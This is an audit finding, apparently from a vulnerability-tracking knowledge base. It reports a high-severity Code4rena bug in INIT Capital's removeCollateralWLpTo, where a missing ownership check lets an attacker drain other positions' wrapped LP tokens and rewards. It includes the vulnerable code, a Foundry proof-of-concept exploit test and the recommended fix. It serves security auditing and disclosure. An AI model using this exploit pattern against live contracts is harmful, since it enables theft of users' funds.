---
tags:
  - lang/solidity
  - sector/farm
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/liquidation-logic
  - impact/loss-of-funds/direct-drain
  - novelty/variant
  - misassumption/math-is-safe
  - fix/redesign-logic
protocol: "[[INIT Capital]]"
auditors:
  - "[[sashik_eth]]"
report: "https://code4rena.com/reports/2023-12-initcapital"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[liquidation-underwater]]"
---
# [H-02] wLp tokens could be stolen

- id: 29590
- impact: HIGH
- protocol: [[INIT Capital]]
- reporter: sashik\_eth (Code4rena)
- source: https://code4rena.com/reports/2023-12-initcapital

## Summary


The report discusses a bug in the `PosManager#removeCollateralWLpTo` function, which allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol. This function can only be called from the core contract using the `decollateralizeWLp` and `liquidateWLp` functions. However, it fails to check if the specified `tokenId` belongs to the current position, which means that anyone can drain any other positions with supplied wLp tokens. This could allow an attacker to steal all LP tokens and accrued rewards from the victim's wLp. The report also includes a proof of concept showing how this exploit could be carried out. To mitigate this issue, it is recommended to add a check that the position holds the specified token in the `removeCollateralWLpTo` function. 

## Details


`PosManager#removeCollateralWLpTo` function allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol:

```solidity
File: PosManager.sol
249:     function removeCollateralWLpTo(uint _posId, address _wLp, uint _tokenId, uint _amt, address _receiver)
250:         external
251:         onlyCore
252:         returns (uint)
253:     {
254:         PosCollInfo storage posCollInfo = __posCollInfos[_posId];
255:         // NOTE: balanceOfLp should be 1:1 with amt
256:         uint newWLpAmt = IBaseWrapLp(_wLp).balanceOfLp(_tokenId) - _amt;
257:         if (newWLpAmt == 0) { 
258:             _require(posCollInfo.ids[_wLp].remove(_tokenId), Errors.NOT_CONTAIN);
259:             posCollInfo.collCount -= 1;
260:             if (posCollInfo.ids[_wLp].length() == 0) {
261:                 posCollInfo.wLps.remove(_wLp);
262:             }
263:             isCollateralized[_wLp][_tokenId] = false;
264:         }
265:         _harvest(_posId, _wLp, _tokenId);
266:         IBaseWrapLp(_wLp).unwrap(_tokenId, _amt, _receiver);
267:         return _amt;
268:     }
```

This function could be called only from the core contract using the `decollateralizeWLp` and `liquidateWLp` functions. However, it fails to check if the specified `tokenId` belongs to the current position, this check would take place only if removing is full - meaning no lp tokens remain wrapped in the wLp (line 257).

This would allow anyone to drain any other positions with supplied wLp tokens. The attacker only needs to create its own position, supply dust amount in wLp to it, and call `decollateralizeWLp` with the desired 'tokenId', also withdrawn amount should be less than the full wLp balance to prevent check on line 257. An attacker would receive almost all lp tokens and accrued rewards from the victim's wLp.

A similar attack for harvesting the victim's rewards could be done through the `liquidateWLp` function.

### Impact

Attacker could drain any wLp token and harvest all accrued rewards for this token.

### Proof of Concept

The next test added to the `tests/wrapper/TestWLp.sol` file could show an exploit scenario:

```solidity
    function testExploitStealWlp() public {
        uint victimAmt = 100000000;
        // Bob open position with 'tokenId' 1
        uint bobPosId = _openPositionWithLp(BOB, victimAmt);
        // Alice open position with 'tokenId' 2 and dust amount 
        uint alicePosId = _openPositionWithLp(ALICE, 1);
        // Alice successfully de-collateralizes her own position using Bob's 'tokenId' and amounts less than Bob's position by 1 to prevent a revert
        vm.startPrank(ALICE, ALICE);
        initCore.decollateralizeWLp(alicePosId, address(mockWLpUniV2), 1, victimAmt - 1, ALICE);
        vm.stopPrank();

        emit log_uint(positionManager.getCollWLpAmt(bobPosId, address(mockWLpUniV2), 1));
        emit log_uint(IERC20(lp).balanceOf(ALICE));
    }

```

### Recommended Mitigation Steps

Consider adding a check that position holds the specified token into the `removeCollateralWLpTo` function:

```solidity
_require(__posCollInfos[_posId].ids[_wlp].contains(_tokenId), Errors.NOT_CONTAIN);
```

**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/31#issuecomment-1870313456)**

***
